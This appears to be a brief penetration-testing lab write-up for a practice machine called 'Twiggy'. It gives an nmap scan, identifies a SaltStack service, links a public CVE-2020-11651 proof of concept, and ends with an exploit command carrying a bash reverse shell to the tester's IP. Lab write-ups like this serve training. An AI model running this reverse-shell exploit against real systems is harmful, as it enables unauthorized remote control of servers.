<h1>NMAP</h1>
```
nmap -sC -sV -oA Twiggy 192.168.195.62
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 21:37 CDT
Nmap scan report for 192.168.195.62
Host is up (0.079s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 447d1a569b68aef53bf6381773165d75 (RSA)
|   256 1c789d838152f4b01d8e3203cba61893 (ECDSA)
|_  256 08c912d97b9898c8b3997a19822ea3ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
8000/tcp open  http    nginx 1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.26 seconds
```

Found that the web server was running Mezzanine on port 80 and provided json on port 8000. Web server was not exploitable as I didn't have credentials. Was able to find that port 800 was running cherrypy with salt stack. Found exploit for salt stack.

https://github.com/jasperla/CVE-2020-11651-poc

```
python3 exploit.py --master 192.168.195.62 --exec "bash -i >& /dev/tcp/192.168.49.195/80 0>&1
```
